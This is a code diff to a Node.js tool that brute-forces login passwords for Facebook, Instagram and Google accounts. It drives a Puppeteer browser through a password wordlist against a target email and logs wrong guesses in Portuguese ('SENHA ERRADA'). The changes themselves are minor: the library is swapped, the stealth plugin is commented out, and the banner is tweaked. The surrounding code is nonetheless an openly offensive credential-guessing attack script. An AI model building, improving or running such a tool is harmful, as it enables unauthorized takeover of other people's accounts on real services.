@@ -1,12 +1,12 @@
 const axios = require("axios");
-const puppeteer = require("puppeteer-extra");
+const puppeteer = require("puppeteer");
 const StealthPlugin = require("puppeteer-extra-plugin-stealth");
 const { ArgumentParser } = require("argparse");
 const fs = require("fs");
-//require('dotenv').config({ path: 'config.env' })
+//require('dotenv').config({ path: 'config.env' });
 require("colors");
 
-puppeteer.use(StealthPlugin());
+//puppeteer.use(StealthPlugin());
 
 const parser = new ArgumentParser({
   description: "parameters example"
@@ -15,11 +15,11 @@ const parser = new ArgumentParser({
 const banner = `
 █████████
 █▄█████▄█
-█▼▼▼▼▼
+█▼ ▼ ▼ ▼
 █      Author: CarlosAllberto
-█▲▲▲▲▲
+█▲ ▲ ▲ ▲
 █████████
-_ ██____██___
+_██___██___
 `;
 
 parser.add_argument("-s", "--site",  { help: "facebook, instagram, google" });
@@ -81,7 +81,7 @@ class brute {
     let config = new brute(site=argSite).loadConfig();
     this.testFile();
     let data = fs.readFileSync(this.passwordFile, { encoding: "utf-8" });
-    console.log(`COMEÇANDO O ATAQUE NO GOOGLE`.bold.green);
+    console.log(`COMEÇANDO O ATAQUE EM: google`.bold.green);
     (async () => {
       let browser = await puppeteer.launch({
         args: ['--no-sandbox'],
@@ -121,7 +121,7 @@ class brute {
     let config = new brute(site=argSite).loadConfig();
     this.testFile();
     let data = fs.readFileSync(this.passwordFile, { encoding: "utf-8" });
-    console.log(`COMEÇANDO O ATAQUE EM ${this.site}\n`.bold.green);
+    console.log(`COMEÇANDO O ATAQUE EM: ${this.site}\n`.bold.green);
     (async () => {
       let browser = await puppeteer.launch({
         args: ['--no-sandbox'],
@@ -141,7 +141,6 @@ class brute {
         await page.waitForNavigation();
         let urlPage = page.url();
         let pageContent = await page.content();
-        console.log(pageContent);
         if(urlPage == config.url || pageContent.indexOf(config.msgError) != -1) {
           console.log(`[-] SENHA ERRADA: ${password}`.red);
           await page.goBack();
@@ -154,9 +153,9 @@ class brute {
   }
 }
 
-var test = new brute().test();
+new brute().test();
 if(argSite == "google") {
-  var result = new brute(site=argSite, email=argEmail, passwordFile=argPassword).attackGoogle();
+  new brute(site=argSite, email=argEmail, passwordFile=argPassword).attackGoogle();
 } else {
-  var result = new brute(site=argSite, email=argEmail, passwordFile=argPassword).attack();
+  new brute(site=argSite, email=argEmail, passwordFile=argPassword).attack();
 }
